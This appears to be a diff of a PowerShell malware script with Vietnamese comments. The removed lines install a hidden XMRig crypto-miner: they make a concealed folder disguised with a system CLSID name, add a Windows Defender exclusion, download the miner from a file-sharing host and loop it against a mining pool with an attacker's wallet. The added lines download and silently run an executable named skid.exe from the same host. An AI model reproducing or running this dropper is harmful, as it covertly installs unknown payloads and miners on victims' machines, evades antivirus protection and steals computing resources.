@@ -1,27 +1,16 @@
-$rdir = "$env:SystemDrive\ProgramData\Loader"
-$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
-New-Item -ItemType Directory -Path $dir
-Add-MpPreference -ExclusionPath $dir
-attrib +h +s $dir
+$folderPath = "C:\ProgramData\LocalLow\LanPiaoPiao"
+$filePath = "$folderPath\skid.exe"
+$url = "https://anonsharing.com/file/2732c05456f80575/skid.exe"
 
-# tải miner cho SkibiditoiletMiner
-$url = "https://anonsharing.com/file/fcd511aeb8b96fef/xmrig-6.21.0.zip"
-$zipPath = "$dir\xmrig.zip"
-Invoke-WebRequest -Uri $url -OutFile $zipPath
-Expand-Archive -Path $zipPath -DestinationPath $dir -Force
-
-$xmrigPath = "$dir\xmrig-6.21.0\xmrig.exe"
-$pool = "stratum+ssl://rx-asia.unmineable.com:443"
-$wallet = "ATOM:cosmos1nqp27fnn3uuyy7xrvu2epdw7592uapmptfx06g.lmaokid"
-$password = "TAOSIEUDEPTRAI"
-
-while ($true) {
-    $proc = Start-Process -FilePath $xmrigPath -ArgumentList "-a rx -o $pool -u $wallet -p $password" -NoNewWindow -PassThru
-    Write-Host "XMRig started with PID $($proc.Id)"
-
-    # Kiểm tra nếu process còn chạy
-    while ($proc.HasExited -eq $false) {
-        Start-Sleep -Seconds 1  # Kiểm tra mỗi 5 giây
-    }
+# Tạo thư mục nếu chưa tồn tại
+if (!(Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath -Force
 }
+
+# Kiểm tra nếu file chưa tồn tại thì tải về
+if (!(Test-Path $filePath)) {
+    Invoke-WebRequest -Uri $url -OutFile $filePath
+}
+
+# Chạy file thực thi
+Start-Process -FilePath $filePath -NoNewWindow
